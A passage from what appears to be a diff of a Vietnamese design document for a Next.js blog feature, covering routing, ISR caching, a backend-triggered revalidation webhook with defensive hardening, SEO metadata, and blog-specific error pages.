+  Renderer là hàm đệ quy: một doc lồng vài nghìn tầng do client tự chế POST lên là làm tràn
+  stack của **server render**, không phải của trình duyệt người gửi.
 
 ---
 
-## 4. 🔸 Quyết định lớn #2 — đường đọc công khai ở `apps/web`
+### 3.3 Anchor của heading và mục lục (TOC)
+
+§3 nói "heading tự sinh `id` cho anchor" nhưng không nói **sinh thế nào** — mà hai heading
+trùng tên trong một bài sẽ ra hai `id` trùng, và anchor nhảy về cái đầu tiên.
+
+- `id` = `slugify(text của heading)` bằng `packages/core/src/blog/slugify.ts` (§10 — cùng hàm
+  dùng cho slug bài, đã bỏ dấu tiếng Việt). Trùng thì thêm hậu tố tăng dần: `gioi-thieu`,
+  `gioi-thieu-2`. Việc đánh số chỉ đúng khi **quét cả cây một lượt trước khi render**, không
+  làm được ở từng node rời.
+- **TOC trích thẳng từ JSON**, không cần backend và không parse HTML: walk cây lấy mọi node
+  `heading` → `{ level, text, id }`. Dùng chung đúng lượt quét ở trên, nên TOC và anchor
+  không bao giờ lệch nhau.
+- Bài có **ít hơn 3 heading thì không hiện TOC** — mục lục hai dòng chỉ tốn chỗ.
+
+### 3.4 Typography đi cùng renderer, không nằm ở `apps/web`
+
+Renderer trả React element chứ không mang style. Nếu class typography (cỡ chữ, khoảng cách,
+style của `blockquote`/`codeBlock`/`table`) nằm ở `apps/web` thì preview trong admin (§8)
+lệch với bản thật — đúng cái mà "một code path" ở §8 dựng ra để tránh. Nên style nằm cùng chỗ
+với renderer trong `packages/ui/src/blog/`, hai app chỉ việc đặt component vào chỗ cần.
+
+---
+
+## 4. ✅ Đã chốt — đường đọc công khai ở `apps/web`
+
+> Ngoại lệ này — lý do và ranh giới (chỉ dữ liệu không cần auth mới đi đường server) — đã
+> được ghi chính thức ở `docs/data-layer.md` §7. Phần dưới là chi tiết triển khai.
 
 ### 4.1 Vì sao không dùng được React Query
 
-`docs/data-layer.md` §6 ghi rõ: **không** SSR prefetch, vì token nằm ở client nên server
-không fetch hộ được. Lý do đó đúng với mọi feature hiện có — nhưng **không đúng với blog**:
-bài viết công khai không cần token, server fetch được hoàn toàn.
+`data-layer.md` §6 cấm SSR prefetch vì token nằm ở client. Lý do đó đúng với mọi feature hiện
+có nhưng **không đúng với blog**: bài công khai không cần token, server fetch được hoàn toàn.
 
-Và với SEO thì không phải "fetch ở server tốt hơn", mà là **bắt buộc**. Render ở client
-nghĩa là HTML đầu tiên rỗng, Googlebot phải chạy JS ở lượt render thứ hai mới thấy chữ —
-chậm, không đảm bảo, và `generateMetadata` thì không có dữ liệu để sinh `<title>`/OG.
+Và với SEO thì fetch ở server không phải "tốt hơn" mà là **bắt buộc**: render ở client thì HTML
+đầu tiên rỗng, Googlebot phải chạy JS ở lượt hai mới thấy chữ, và `generateMetadata` không có
+dữ liệu để sinh `<title>`/OG.
 
-Nên blog là **ngoại lệ đầu tiên** của §6, và phải ghi vào `data-layer.md` như `chat` đã
-được ghi — kèm ranh giới rõ để không ai bê ngoại lệ này sang feature có token.
-
-### 4.2 Hình dạng đề xuất
+### 4.2 Hình dạng
 
 Thêm một tầng thứ tư, **song song** với `api.ts` chứ không thay nó:
 
@@ -199,18 +464,24 @@ Ba ràng buộc của `server.ts`, cả ba đều là lý do kỹ thuật chứ 
 3. **Vẫn `schema.parse` như tầng api.** Mất axios interceptor thì phải tự validate, nếu
    không backend đổi shape sẽ làm hỏng trang public mà không ai biết.
 
-### 4.3 🔸 Base URL cho fetch ở server
+⚠️ `import "server-only"` cần **package `server-only`** — hiện **chưa có** trong bất kỳ
+`package.json` nào của repo (đã kiểm). Thêm vào `dependencies` của `packages/api`, không phải
+của app: nó là ràng buộc của file `server.ts`, mà file đó thuộc package này.
+
+### 4.3 Base URL cho fetch ở server
 
 Đây là chi tiết dễ vấp nhất khi lên production. `NEXT_PUBLIC_API_BASE_URL` bị **inline lúc
 build** (xem `.env.production.example`) và trỏ ra `https://api-noalhub.duckdns.org`. Container
 Next dùng chính nó để fetch ở server thì request đi ra internet, vòng qua nginx, rồi quay lại
 cùng máy — chậm và phụ thuộc DNS/TLS công khai cho một cuộc gọi nội bộ.
 
-Đề xuất thêm một biến **runtime, không phải `NEXT_PUBLIC_`**:
+Nên có một biến **runtime, không phải `NEXT_PUBLIC_`**:
 
 ```
 API_INTERNAL_URL=http://api:3101      # tên service trong docker network của repo BE
 ```
+
+✅ Hai container **cùng network** — đã xác nhận, xem §5.2c.
 
 `server.ts` đọc `process.env.API_INTERNAL_URL ?? API_BASE_URL` — dev không khai thì tự rơi
 về localhost, production khai thì đi thẳng qua mạng nội bộ.
@@ -225,19 +496,88 @@ mâu thuẫn với ghi chú "không có env cho web" đang có, và người đ�
 Repo **không bật `cacheComponents`** (kiểm chứng: cả hai `next.config.ts` đều không có).
 Nên áp dụng mô hình cũ (`node_modules/next/dist/docs/01-app/02-guides/caching-without-cache-components.md`
 + `incremental-static-regeneration.md`), tức là `export const revalidate` + `revalidateTag`.
-🔸 **Đừng bật `cacheComponents` chỉ vì blog** — nó là cờ toàn app, kéo theo phải rà lại mọi
+⚠️ **Đừng bật `cacheComponents` chỉ vì blog** — nó là cờ toàn app, kéo theo phải rà lại mọi
 route chat/dashboard đang chạy tốt. Nếu muốn bật thì đó là một đợt riêng.
 
 | Route | Chiến lược | Ghi chú |
 | --- | --- | --- |
-| `/blog` | ISR, `revalidate = 60` | Trang 1 tĩnh; phân trang bằng `?page=` sẽ làm route thành dynamic — 🔸 cân nhắc `/blog/page/[n]` để trang nào cũng tĩnh và có canonical riêng |
-| `/blog/[slug]` | ISR + `generateStaticParams` từ `/blog/sitemap-entries` | Bài mới publish sau build vẫn chạy được nhờ `dynamicParams` mặc định (`true`) — render on-demand lần đầu rồi cache |
-| `/blog/tag/[tag]` | ISR, `revalidate = 300` | |
+| `/blogs` | **Dynamic** (đọc `searchParams.page`) + cache ở tầng `fetch` | Danh sách. Xem §4.5 |
+| `/blogs/[slug]` | ISR + `generateStaticParams` từ `/blog/sitemap-entries` | Bài mới publish sau build vẫn chạy được nhờ `dynamicParams` mặc định (`true`) — render on-demand lần đầu rồi cache |
+| `/blogs/category/[slug]` | ISR, `revalidate = 300` | Trục được index (§2.6) |
+| `/blogs/tag/[tag]` | ISR, `revalidate = 300` | `noindex, follow` (§2.6) |
+| `/blogs/tag` | ISR, `revalidate = 3600` | Chỉ mục thẻ, `noindex` (§6.5) |
 | `sitemap.ts`, `rss` | `revalidate = 3600` | Là Route Handler, mặc định được cache |
+
+#### 4.4a ⚠️ `generateStaticParams` không được phép làm đỏ build
+
+`.github/workflows/publish.yml` build image trên **GitHub runner**, và truyền
+`NEXT_PUBLIC_API_BASE_URL=https://api-noalhub.duckdns.org` làm build-arg. `API_INTERNAL_URL`
+(§4.3) là biến **runtime của compose** nên lúc build **không tồn tại** → `server.ts` rơi về URL
+công khai. Nghĩa là `next build` sẽ gọi API production từ runner: backend sập, đang deploy, hay
+DuckDNS trục trặc đúng lúc đó thì **build FE đỏ** — và lỗi hiện ra ở một feature không liên
+quan gì tới bài viết.
+
+```ts
+export async function generateStaticParams() {
+  try {
+    return (await getSitemapEntries()).map((e) => ({ slug: e.slug }));
+  } catch {
+    return []; // dynamicParams mặc định true → vẫn render on-demand
+  }
+}
+```
+
+Đổi lại gần như không mất gì: **mỗi lần deploy là container mới, ISR cache rỗng**, nên
+pre-render lúc build chỉ tiết kiệm được lượt truy cập **đầu tiên** của mỗi bài sau mỗi lần
+deploy. Không đáng đổi lấy một điểm gãy trong CD.
+
+### 4.5 ✅ Đã chốt — danh sách ở `/blogs`, phân trang bằng query
+
+Trang danh sách nằm ngay ở **`/blogs`** (`app/(public)/blogs/page.tsx`), phân trang bằng
+**query string**: `/blogs?page=2`. Không dùng `/blogs/page/[n]`, cũng không dùng `/blogs/list`.
+
+Lý do bỏ `/blogs/list`: nó là **segment tĩnh cùng cấp với `/blogs/[slug]`**, mà Next luôn cho
+segment tĩnh thắng segment động — một bài đặt slug `list` sẽ vĩnh viễn không mở được. Để danh
+sách ở chính `/blogs` thì không sinh ra slug cấm nào (`page.tsx` của thư mục không phải một
+segment con). Chuyện này nằm trong router của `apps/web`, không liên quan tới việc admin ở
+domain/repo khác.
+
+Hệ quả phải biết trước, ghi ra để sau này không ai tưởng là bug:
+
+- **Route thành dynamic.** Đụng vào `searchParams` là Next bỏ tĩnh hoá, `export const revalidate`
+  ở page không còn tác dụng: mỗi request là một lần render. Đây là chi phí đã chấp nhận, không
+  phải cấu hình sai.
+- **Bù lại bằng cache ở tầng `fetch`.** `server.ts` (§4.2) gọi
+  `fetch(..., { next: { revalidate: 60, tags: ["blog-list"] } })`. Trang render mỗi request nhưng
+  không đấm vào backend mỗi request, và webhook §5.2 vẫn xoá được cache qua `revalidateTag`.
+- **Canonical tự dựng.** `generateMetadata` phải trả
+  `alternates.canonical = "/blogs"` cho `page=1` (kể cả khi URL có `?page=1`) và
+  `"/blogs?page=N"` cho trang sau — nếu không `?page=1`, `/blogs`, và `?page=` rỗng là ba URL
+  cùng nội dung.
+- ⚠️ **Phân trang phải là `<a href>` thật, không phải nút bấm.**
+  `packages/ui/src/pagination.tsx` hiện là `"use client"` + `onPageChange` — Googlebot có chạy
+  JS nhưng **không bấm nút**, nên từ trang 2 trở đi không có đường crawl nào từ trong site. Bài
+  vẫn vào index qua sitemap (§6.3) nên không mất bài; cái mất là **toàn bộ internal linking**,
+  và URL chỉ-có-trong-sitemap bị Google xếp ưu tiên thấp hơn. → Cần **component thứ hai** ở
+  `packages/ui` (ví dụ `PaginationLinks`) render `<a href="/blogs?page=N">`. Không sửa cái cũ:
+  bản admin phải giữ state client, hai nhu cầu khác nhau.
+- **`page` ngoài khoảng hợp lệ** (không phải số, < 1, hoặc vượt tổng số trang) → `notFound()`,
+  không render danh sách rỗng trả 200. Kiểm được là nhờ `total` trong envelope (§2.1a).
+- **`limit` của trang blog là 10** (trần backend 50). Chính con số này định nghĩa "vượt tổng số
+  trang" ở trên, nên đừng để mỗi chỗ một giá trị.
+- `rel="prev"/"next"` thì cứ đặt (Bing và RSS reader vẫn đọc), nhưng **Google đã bỏ dùng từ
+  2019** — đừng trông cậy vào nó thay cho gạch đầu dòng đầu tiên.
+- ⚠️ **Ba slug cấm**: `category`, `tag`, `rss.xml` — chúng là segment tĩnh cùng cấp với
+  `/blogs/[slug]` (§10), mà Next luôn cho segment tĩnh thắng segment động. Backend chặn ba
+  chuỗi này khi validate slug bài; danh sách ngắn nên đừng quên cập nhật nếu sau này thêm route
+  con nào khác dưới `/blogs`. (Slug **chuyên mục** và slug **thẻ** thì không bị ràng buộc này —
+  chúng nằm ở tầng dưới `/blogs/category/…`, `/blogs/tag/…`, không đụng `/blogs/[slug]`.)
+- **Sitemap chỉ liệt kê `/blogs`** (trang 1) + từng `/blogs/[slug]`. Không đưa
+  `?page=N` vào sitemap — Google tự bò theo link phân trang.
 
 ---
 
-## 5. 🔸 Quyết định lớn #3 — "nhấn Publish thì bài mới release"
+## 5. ✅ Đã chốt — "nhấn Publish thì bài lên liền"
 
 Yêu cầu này có **hai nửa**, dễ lẫn vào nhau:
 
@@ -245,35 +585,134 @@ Yêu cầu này có **hai nửa**, dễ lẫn vào nhau:
   `GET /blog/posts` lọc `status = published`, `GET /blog/posts/{slug}` trả 404 cho bài nháp.
   FE không tham gia, và đó là điểm mạnh: không có màn hình nào lộ được thứ backend không trả.
 - **Nửa cache** — `apps/web` đã cache trang tĩnh rồi thì bài mới xuất hiện **lúc nào**.
-  Đây mới là phần cần quyết.
+  Đây là phần đã quyết: **phương án B — revalidate on-demand**, backend gọi webhook.
 
-### 5.1 Phương án A — chỉ ISR theo thời gian (đề xuất cho Phase 1)
+### 5.1 Nền — ISR theo thời gian
 
-`revalidate = 60` ở `/blog`. Publish xong, chậm nhất 60 giây sau là bài lên. Không cần thêm
-endpoint, không cần secret, không có gì để hỏng.
+`revalidate = 60` cho `fetch` của danh sách (§4.5), các con số khác ở §4.4. Webhook là đường
+nhanh, **không phải đường duy nhất**: nó hỏng hay bị bỏ lỡ thì chậm nhất 60 giây trang vẫn tự
+đúng lại. Đây cũng là hành vi khi §5.2 chưa làm xong.
 
-Đủ cho blog. "Publish rồi mà F5 chưa thấy" là chuyện xảy ra đúng một lần và giải thích được;
-đổi lại là không thêm một mặt tiếp xúc nào.
-
-### 5.2 Phương án B — revalidate on-demand (Phase 2, nếu thật sự cần tức thì)
+### 5.2 ✅ Chốt — revalidate on-demand
 
 `apps/web` mở một Route Handler `POST /api/revalidate`:
 
 ```
-POST https://noalhub.duckdns.org/api/revalidate
+POST http://web:3000/api/revalidate              (nội bộ — xem §5.2c)
 Header: x-revalidate-secret: <shared secret>
-Body:   { "slug": "bai-viet-abc" }
-→ revalidatePath("/blog"), revalidatePath(`/blog/${slug}`), revalidatePath("/sitemap.xml")
+Body:   { "slugs":      ["bai-viet-abc", "slug-cu-neu-vua-doi"],
+          "categories": ["huong-dan"],
+          "tags":       ["react", "nextjs"] }
+→ revalidateTag: blog-list · blog-post:<mỗi slug> · blog-category:<mỗi category>
+                 · blog-tag:<mỗi tag> · blog-categories · blog-tags · blog-sitemap
+```
+
+⚠️ **Body là `slugs` số nhiều.** §5.2b yêu cầu đổi slug thì revalidate **cả slug cũ lẫn mới**
+(§2.4) — một trường đơn không diễn tả được việc đó.
+
+⚠️ **Dùng `revalidateTag` cho tất cả, không dùng `revalidatePath`.** Mọi `fetch` trong
+`server.ts` phải mang tag:
+
+| Tag | Gắn ở fetch nào | Xoá khi |
+| --- | --- | --- |
+| `blog-list` | `GET /blog/posts` (mọi trang) | publish, unpublish/archive, sửa bài đã published |
+| `blog-post:<slug>` | `GET /blog/posts/{slug}` | như trên — cho từng slug trong body |
+| `blog-category:<slug>` | `GET /blog/posts?category=…` | như trên — và khi **dời bài sang mục khác**, gửi **cả mục cũ lẫn mục mới** |
+| `blog-categories` | `GET /blog/categories` | `postCount` đổi (publish/unpublish/dời mục), hoặc CRUD chuyên mục (§2.2) |
+| `blog-tag:<tag>` | `GET /blog/posts?tag=…` | như trên — cho **cả thẻ cũ và mới** của bài |
+| `blog-tags` | `GET /blog/tags` | bài đầu tiên mang một thẻ mới, hoặc bài cuối cùng bỏ thẻ đó |
+| `blog-sitemap` | `GET /blog/sitemap-entries` | mọi thay đổi trạng thái published |
+
+Vì sao không `revalidatePath`: `/blogs` và `/blogs?page=2` là **hai path khác nhau**, nên
+`revalidatePath("/blogs")` không đụng tới trang 2, còn một tag thì phủ hết. Và bản `{ slug }`
+ban đầu **bỏ sót trang tag lẫn RSS**: unpublish một bài xong thì `/blogs/tag/react` còn hiện nó
+thêm 300 giây và `rss.xml` thêm 3600 giây (§4.4) — đúng loại sai lệch không ai để ý.
+
+Chuỗi sự kiện đầy đủ — admin bấm Publish thì bài **lên ngay**, chỉ khác ở chỗ ai bấm chuông:
+
+```
+admin bấm Publish
+  → PATCH /blog/posts/{id}  (admin → backend)
+      → backend đổi status = published trong DB
+      → backend gọi POST /api/revalidate kèm secret   (backend → web)
+      → web xoá cache tag blog-list + /blogs/<slug> + /sitemap.xml
+  → F5 thấy ngay, không chờ 60 giây
 ```
 
 ⚠️ **Người gọi phải là backend, không phải `apps/admin`.** Admin là code chạy trong trình
-duyệt — nhét secret vào đó là công khai secret, còn gọi không secret là mở cho bất kỳ ai
-spam revalidate. Backend gọi trong transaction publish thì cũng đúng ngữ nghĩa hơn: bài lên
-sóng vì DB đã đổi, chứ không vì ai đó bấm nút.
+duyệt — nhét secret vào đó là công khai secret (mở Network tab là thấy), còn gọi không secret
+là mở cho bất kỳ ai spam revalidate: mỗi cú ép `web` render lại và gọi ngược backend, tức là
+tự dựng sẵn một cần gạt DoS. Backend gọi ngay tại chỗ nó đổi `status` thì **mọi** đường làm
+bài published — nút bấm, script seed, đồng bộ sau này — đều kéo theo revalidate, không sót
+đường nào, và không lệch khi mạng của admin rớt đúng lúc.
 
 ⚠️ ISR cache nằm **trong từng container**. Hiện chỉ có một container `web` nên không sao;
 ngày nào scale lên 2 replica thì một cú webhook chỉ làm mới đúng một cái, cái kia vẫn phục vụ
 bản cũ cho tới khi hết `revalidate`. Lúc đó cần shared cache handler — ghi ra để khỏi bất ngờ.
+
+#### 5.2a Việc ở `apps/web`
+
+- `app/api/revalidate/route.ts` — `POST`, `export const dynamic = "force-dynamic"`.
+- So sánh secret bằng **timing-safe compare** (`crypto.timingSafeEqual` trên hai Buffer cùng
+  độ dài), không phải `===`.
+- Sai/thiếu secret → `401` và **không** nói gì thêm; body sai shape → `400`.
+- Không nhận đường dẫn tuỳ ý từ body. Chỉ nhận `slugs` / `categories` / `tags` — mỗi phần tử
+  validate `^[a-z0-9-]+$` (đúng dạng slug của §2.6, nên regex này khớp cho cả ba mảng), và
+  **giới hạn số lượng** (ví dụ ≤ 50 mỗi mảng) — rồi **tự dựng tên tag** ở phía web.
+  Nếu không thì endpoint thành công cụ ép render bất kỳ route nào của app, và một body vài
+  nghìn phần tử là một cần gạt DoS khác.
+- Trả `{ revalidated: true, now: Date.now() }`.
+
+#### 5.2b Việc ở backend (repo BE)
+
+- Env `WEB_REVALIDATE_URL` + `WEB_REVALIDATE_SECRET`.
+- Gọi **sau khi commit**, không phải trong transaction: transaction rollback mà webhook đã bắn
+  thì cache mất đồng bộ theo chiều ngược lại. Gọi ở các đường: publish, unpublish/archive,
+  sửa bài đã published, đổi slug (gửi **cả slug cũ và mới** trong `slugs`), đổi thẻ (gửi **cả
+  thẻ cũ và mới** trong `tags` — gỡ một thẻ khỏi bài mà không revalidate thẻ cũ thì
+  `/blogs/tag/<cũ>` vẫn còn liệt kê bài đó), **dời chuyên mục** (gửi **cả mục cũ và mới** trong
+  `categories`), và **CRUD chuyên mục** (§2.2 — đổi tên một mục là đổi tiêu đề trang
+  `/blogs/category/<slug>` đang được cache).
+- Lỗi mạng thì **nuốt và log**, không làm fail request publish. Bài đã vào DB rồi; cùng lắm là
+  rơi về đúng hành vi §5.1 (60 giây).
+- Timeout ngắn (2–3 giây), không retry vô hạn.
+
+#### 5.2c Việc ở hạ tầng — ✅ chốt: gọi nội bộ, chặn công khai
+
+`WEB_REVALIDATE_URL = http://web:3000/api/revalidate` — **tên service trong docker network**,
+HTTP thuần, không qua nginx/DuckDNS.
+
+- `WEB_REVALIDATE_SECRET` phải có ở **cả hai** phía và **khớp nhau**: khối `environment:` của
+  service `web` trong `docker-compose.prod.yml` (biến runtime, cùng loại với ghi chú §4.3) và
+  env của service backend. Thêm cả vào `.env.production.example`.
+- Không cần vào `.github/workflows/publish.yml` — nó đọc lúc chạy, không lúc build.
+- **Chặn đường công khai** ở nginx, trong server block của `noalhub.duckdns.org`:
+
+  ```nginx
+  location = /api/revalidate { deny all; }
+  ```
+
+  Đặt **trước** `location /` để nó thắng. Dùng `location =` (exact match) chứ không phải
+  prefix — tránh chặn nhầm route `/api/...` khác nếu sau này có.
+
+**Vì sao nội bộ.** Không phải chuyện tốc độ. Endpoint này không phục vụ trình duyệt nào cả —
+chỉ backend gọi. Để nó công khai là *tác dụng phụ* của việc `web` nằm sau nginx, không phải
+một lựa chọn. Mà nó lại đắt và khuếch đại: một request hợp lệ ép `web` xoá cache + render lại
++ fetch ngược backend, nên kẻ tấn công tốn 1 request còn ta tốn cả vòng render. Có secret vẫn
+là để sẵn mục tiêu brute-force với chi phí thất bại bằng 0. Đường nội bộ + `deny all` thì cửa
+biến mất, secret còn lại chỉ là lớp hai.
+
+Đi vòng ra ngoài còn kéo theo **hairpin NAT** (container gọi IP công của chính host mình) —
+kịch bản routing hay hỏng âm thầm, và triệu chứng của nó ("publish xong 60 giây mới lên") lại
+trùng đúng hành vi fallback §5.1, nên hỏng mà không ai biết.
+
+✅ **Điều kiện đã xác nhận**: `web` và service backend **cùng một docker network** (Noah xác
+nhận 2026-08-30). Nên gọi nội bộ chạy được ở cả hai chiều — `web → http://api:3101` (§4.3) và
+`backend → http://web:3000` (§5.2c). Việc còn lại chỉ là đối chiếu **tên service** và **cổng
+container** trong `docker-compose.prod.yml` khi viết env, đừng chép mù hai chuỗi trên.
+Nếu tách compose thì thứ tự ưu tiên: khai `networks: external` cho nhau >
+`http://172.17.0.1:3000` (docker gateway) > mở public. Mở public là phương án cuối, và nếu
+phải mở thì thay `deny all` bằng IP allowlist của backend, không để trống.
 
 ### 5.3 Đăng theo lịch — chưa làm
 
@@ -292,23 +731,39 @@ danh sách hiện sai trạng thái). Không có nhu cầu thật thì đừng l
       ⚠️ `NEXT_PUBLIC_APP_URL` đã có trong `.env.local` nhưng **chưa có** trong khối `env:` của
       `.github/workflows/publish.yml` → build production sẽ ra `undefined` và mọi URL tuyệt đối
       hỏng. Phải thêm cùng lượt.
-- [ ] `app/robots.ts` ở `apps/web`: allow `/`, disallow `/chat`, `/friends`, `/dashboard`,
-      `/profile`, `/login`, `/register`, `/reset-password`; trỏ `sitemap`.
+- [ ] `app/robots.ts` ở `apps/web`: allow `/blogs`; disallow `/`, `/chat`, `/friends`,
+      `/dashboard`, `/profile`, `/login`, `/register`, `/reset-password`; trỏ `sitemap`.
 - [ ] `app/robots.ts` ở `apps/admin`: **`disallow: "/"` toàn bộ**. Admin không có gì để index.
-- [ ] 🔸 Vùng công khai: `apps/web/app/(public)/` cho blog, và quyết định số phận của `/`.
+- [ ] Vùng công khai `apps/web/app/(public)/` cho blog. ✅ **`/` giữ nguyên trong `(protected)`** —
+      không làm landing đợt này; chấp nhận domain gốc không index được (nên robots disallow `/`,
+      sitemap không chứa `/`). Landing là một đợt riêng.
+- [ ] ⚠️ **`apps/web/app/(public)/layout.tsx`** — thiếu file này thì blog thừa hưởng root
+      layout, mà root layout hiện chỉ bọc `AuthProvider` + `QueryProvider` (không chặn render,
+      xem `packages/ui/src/auth/auth-provider.tsx`) và **không có header/footer công khai nào**:
+      bài viết nổi lơ lửng, không đường về `/blogs`, không nav, không footer. Cần header tối
+      giản (logo → `/blogs`, **danh sách chuyên mục** từ `GET /blog/categories`, link Đăng nhập)
+      + footer. Chuyên mục nằm ở nav chính là lý do nó tồn tại như một trục riêng (§2.6) — thẻ
+      thì **không** lên nav, chỉ xuất hiện dưới mỗi bài. Đây cũng là chỗ đặt breadcrumb hiển thị
+      cho khớp với JSON-LD `BreadcrumbList` (§6.2) — có structured data mà trang không có
+      breadcrumb thật là thứ Google coi là không khớp.
 
 ### 6.2 Mỗi bài viết
 
 - [ ] `generateMetadata` (server-only, `params` là **Promise** ở Next 16 — phải `await`):
-      `title` ← `seo.metaTitle ?? title`; `description` ← `seo.metaDescription ?? excerpt`;
-      `alternates.canonical` ← `seo.canonicalUrl ?? /blog/${slug}`;
+      `title` ← `seo.metaTitle ?? title`; `description` ← `seo.metaDescription ?? excerpt`
+      (§2.3b — backend đảm bảo `excerpt` luôn có, nên không cần tầng thứ ba);
+      `alternates.canonical` ← `seo.canonicalUrl ?? /blogs/${slug}`;
       `robots: { index: !seo.noindex }`.
-- [ ] `openGraph`: `type: "article"`, `publishedTime`, `modifiedTime`, `authors`, `tags`,
-      `images` (1200×630), `locale: "vi_VN"`. `twitter: { card: "summary_large_image" }`.
+- [ ] `openGraph`: `type: "article"`, `publishedTime`, `modifiedTime`, `authors`,
+      `section` ← **tên chuyên mục**, `tags` ← tên các thẻ (§2.6 — `article:section` là số ít,
+      `article:tag` là số nhiều, đúng hình dạng hai trục), `images` (1200×630),
+      `locale: "vi_VN"`. `twitter: { card: "summary_large_image" }`.
 - [ ] **JSON-LD** `BlogPosting` + `BreadcrumbList` — `<script type="application/ld+json">` render
       ở server component. Đây là thứ Google dùng để hiện rich result, `<meta>` không thay được.
-- [ ] `notFound()` khi 404 — **không** render trang 200 kèm chữ "không tìm thấy". Trang 200 rỗng
-      bị index như nội dung mỏng.
+      Breadcrumb ba cấp nhờ có chuyên mục: **Blog → `<chuyên mục>` → `<tiêu đề bài>`**. Không có
+      trục chuyên mục thì breadcrumb chỉ còn hai cấp và gần như vô nghĩa.
+- [ ] `notFound()` khi 404 (§6.4) — **không** render trang 200 kèm chữ "không tìm thấy": trang
+      200 rỗng bị index như nội dung mỏng.
 - [ ] `permanentRedirect` khi slug cũ (§2.4).
 - [ ] Heading trong bài phải là `<h2>`/`<h3>` — `<h1>` chỉ một cái, là tiêu đề bài.
 - [ ] `next/image` với `priority` cho ảnh bìa; `images.remotePatterns` trong `next.config.ts`
@@ -317,10 +772,89 @@ danh sách hiện sai trạng thái). Không có nhu cầu thật thì đừng l
 ### 6.3 Toàn site
 
 - [ ] `app/sitemap.ts` từ `/blog/sitemap-entries` (+ các trang tĩnh), `revalidate = 3600`.
-- [ ] RSS: `app/blog/rss.xml/route.ts`.
+- [ ] RSS: `app/(public)/blogs/rss.xml/route.ts` — ⚠️ mâu thuẫn với §3, gỡ ở **§6.6** trước
+      khi viết renderer.
+- [ ] Sitemap gồm: `/blogs`, từng `/blogs/[slug]`, từng `/blogs/category/[slug]`.
+      **Không** gồm `?page=N` (§4.5) và **không** gồm trang thẻ (§2.6 — thẻ `noindex`).
 - [ ] 🔸 `opengraph-image.tsx` động bằng `ImageResponse`: đẹp nhưng cần **file font nhúng sẵn**
       trong image Docker (`output: standalone` không tự trace font từ `next/font/google`).
       Rẻ hơn: dùng `coverImageUrl` của bài, chỉ làm OG động khi thật sự cần.
+
+### 6.4 ✅ Đã chốt — trang lỗi riêng cho blog
+
+Blog **luôn** có trang lỗi của chính nó, không rơi về màn hình trắng hay `error.tsx` toàn app.
+Hai file, **hai loại lỗi khác hẳn nhau** — đừng gộp:
+
+| File | Bắt gì | Status HTTP | Nội dung |
+| --- | --- | --- | --- |
+| `app/(public)/blogs/not-found.tsx` | `notFound()` — bài không tồn tại, chưa publish, đã `archived`, hoặc `?page` ngoài khoảng | **404** | "Không tìm thấy bài viết" + link về `/blogs` + vài bài mới nhất |
+| `app/(public)/blogs/error.tsx` | Backend chết, timeout, `schema.parse` fail (§4.2) | **500** | "Không tải được bài viết" + nút thử lại (`reset()`) |
+
+Ràng buộc:
+
+- **`error.tsx` bắt buộc là `"use client"`** — Next chỉ nhận error boundary ở client. Nó **không**
+  bắt được lỗi trong `generateMetadata`; lỗi ở đó làm hỏng cả route, nên `generateMetadata` phải
+  tự `try/catch` và trả metadata tối thiểu thay vì ném.
+- **Không đảo hai loại này.** Bài không tồn tại mà trả 500 thì Google thử lại mãi; backend chết mà
+  trả 404 thì Google **gỡ bài thật khỏi index** chỉ vì một lần API sập. Đây là lý do §2.1 tách rõ
+  404 `POST_NOT_FOUND` với các lỗi khác: `server.ts` map 404 → `notFound()`, **mọi thứ còn lại →
+  throw** để `error.tsx` lo.
+- Cả hai trang đặt `robots: { index: false }`.
+- Đặt trong thư mục `blogs/` chứ không ở root app: nội dung và layout của trang lỗi blog khác trang
+  lỗi của app chat.
+
+### 6.5 Trang chuyên mục, trang thẻ, bài liên quan, trạng thái rỗng
+
+Hai trục (§2.6) được đối xử **khác nhau** ở đây, và đó là toàn bộ điểm của việc tách chúng ra:
+
+| | `/blogs/category/[slug]` | `/blogs/tag/[tag]` · `/blogs/tag` |
+| --- | --- | --- |
+| `robots` | index, follow | **`noindex, follow`** |
+| Canonical | trỏ về chính nó | trỏ về chính nó (vẫn đặt, dù noindex) |
+| Sitemap | ✅ có | ❌ không |
+| Nav | có, ở header công khai (§6.1) | không — chỉ xuất hiện dưới mỗi bài |
+| `<h1>` | tên chuyên mục | tên thẻ |
+| Mô tả đầu trang | `description` của chuyên mục (§2.2) — đây là thứ làm nó **không** phải trang mỏng | không có |
+
+Lý do đầy đủ của `noindex` cho thẻ ở §2.6. Ngắn gọn: hai trục cùng cắt một tập bài, cho index
+cả hai là tự sinh ra hàng chục URL gần trùng nhau.
+
+- **`/blogs/category` trần** (không có slug) → `redirect("/blogs")`, **không** 404. Nav không
+  bao giờ trỏ tới nó; người vào đây là do gõ tay hoặc cắt bớt URL, và với họ trang danh sách
+  mới là thứ cần.
+- **`/blogs/tag` (chỉ mục thẻ)** thì ngược lại, là trang thật: danh sách thẻ + số bài từ
+  `GET /blog/tags`. Vẫn `noindex`, vì nó cũng chỉ là mục lục của các trang noindex.
+- **Chuyên mục hoặc thẻ không tồn tại → `notFound()`**, không phải danh sách rỗng trả 200.
+  Cùng lý do với `?page` ngoài khoảng (§4.5) và với §6.4: trang 200 rỗng bị index như nội dung
+  mỏng.
+- **Chuyên mục tồn tại nhưng chưa có bài nào** → vẫn **200** kèm khối rỗng có chữ. Khác với ca
+  trên: chuyên mục là tập do admin tạo, rỗng là trạng thái hợp lệ tạm thời, không phải URL sai.
+- **`/blogs` chưa có bài nào** thì vẫn là **200** — đó là trạng thái đúng của site, không phải
+  lỗi. Hiện một khối rỗng có chữ, đừng để trắng.
+- **Bài liên quan** ở cuối mỗi bài, 3 bài **cùng chuyên mục** — cách lấy và lý do ở §2.5.
+- 🔸 **Bài `archived` nên trả 410 chứ không 404** cho URL đã từng publish: 410 nói với Google
+  "đã gỡ hẳn", nó gỡ khỏi index dứt khoát hơn 404. `notFound()` của Next chỉ ra 404, muốn 410
+  phải tự set status ngoài luồng đó. **Không làm đợt này** — ghi ra để 404 là lựa chọn có ý
+  thức chứ không phải bỏ sót.
+
+### 6.6 ⚠️ RSS cần chuỗi HTML — mà §3 chốt "không có đường nào nhả HTML thô"
+
+Đây là mâu thuẫn nội bộ của plan, phải gỡ **trước** khi viết renderer. `rss.xml` là XML
+string: `<description>` / `<content:encoded>` phải là **chuỗi đã escape**, không phải React
+tree. Renderer ở `packages/ui/src/blog/post-content.tsx` trả React element nên không dùng được
+trong Route Handler.
+
+| | (a) RSS chỉ mang `excerpt` — ✅ **chốt** | (b) Viết thêm `postContentToHtml()` |
+| --- | --- | --- |
